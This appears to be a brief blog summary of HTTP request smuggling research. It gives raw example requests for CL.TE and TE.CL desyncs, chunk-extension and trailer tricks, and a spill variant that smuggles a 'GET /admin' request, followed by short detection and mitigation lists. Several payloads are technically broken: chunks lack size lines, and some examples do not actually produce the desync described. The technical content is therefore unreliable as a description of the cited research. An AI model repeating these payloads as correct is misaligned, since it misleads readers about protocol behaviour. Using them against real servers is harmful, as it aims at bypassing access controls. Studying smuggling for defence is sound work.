---
title: "Funky Chunks: HTTP Request Smuggling via Chunked Parsing"
date: 2025-06-18
categories:
  - Security Research
  - HTTP Request Smuggling
  - Transfer-Encoding
---

## Overview

Abusing chunked-body line-terminator ambiguity inside ignored chunk extensions and oversized-chunk spill to create new request-smuggling differentials without relying on Content-Length vs Transfer-Encoding confusion.

## Introduction

HTTP request smuggling has been a well-known vulnerability class for years. This research identifies new smuggling variants using chunked parsing discrepancies.

## Traditional Request Smuggling

### CL.TE (Content-Length + Transfer-Encoding)

```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

ABCDEF
0

```

### TE.CL (Transfer-Encoding + Content-Length)

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

ABCD
0

```

## New Techniques

### 1. EXT.TERM Variant

Chunk extensions are supposed to be ignored, but some parsers handle them differently:

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

AAAA;extension=value
```

### 2. Spill-Based Smuggling

When oversized chunk data spills into next request:

```
POST /search HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

verylongdataoverflowingintonextrequest
0

GET /admin HTTP/1.1
Host: example.com

```

### 3. Trailer Handling

Some servers process trailers differently:

```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

0

X-Injected: value
```

## Detection

Tools like:
- HTTPsmugg
- Burp Suite
- Custom Python scripts

## Mitigation

- Disable chunked encoding at edge
- Consistent parsing between front-end/back-end
- Protocol validation

## References

- [Original Research](https://w4ke.info/2025/06/18/funky-chunks.html)
- [Addendum](https://w4ke.info/2025/10/29/funky-chunks-2.html)
